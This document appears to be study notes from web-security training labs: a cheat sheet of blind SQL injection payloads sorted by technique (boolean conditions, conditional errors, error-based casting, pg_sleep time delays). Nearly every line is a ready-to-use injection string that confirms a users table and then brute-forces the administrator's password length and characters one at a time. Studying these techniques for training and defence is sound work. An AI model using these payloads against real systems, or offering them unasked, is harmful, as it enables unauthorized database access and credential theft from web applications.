


# Blind SQL injection with conditional responses
- order by 1 --
- and (select 'a' from users limit 1)='a' --  > check if users exist
- and (select 'a' from users where username='administrator' limit 1)='a' --
-  and (select 'a' from users where username='administrator' and length(password)=20 limit 1)='a' --
- and (select substring(password,1,1) from users where username='administrator' )='f' --  >> brute force on this
# Blind SQL injection with conditional errors
- || ( SELECT 'a' from dual where rownum=1) ||'--  > to identify the version (try ctrl+u on burp)
- '|| ( SELECT 'a' from users where rownum=1) ||'--
- ''|| ( SELECT case when length(password)=20 then to_char(1/0) else 'a' end from users where username = 'administrator') ||'--   > if an error returns then the length is 20
- '|| ( SELECT case when substr(password,1,1)='q' then to_char(1/0) else 'a' end from users where username = 'administrator') ||'--   > then brute force
# Visible error-based SQL injection
- ' and cast((select password from users limit 1) as int)=1 --
# Blind SQL injection with time delays
- '||  (SELECT pg_sleep(10)) ||'--
# Blind SQL injection with time delays and information retrieval
- '|| (SELECT CASE WHEN ((select 'a' from users where username='administrator' and length(password)=20)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END)||' --
- '|| (SELECT CASE WHEN ((select substring(password,1,1) from users where username='administrator')='p') THEN pg_sleep(10) ELSE pg_sleep(0) END)||' --  > brute force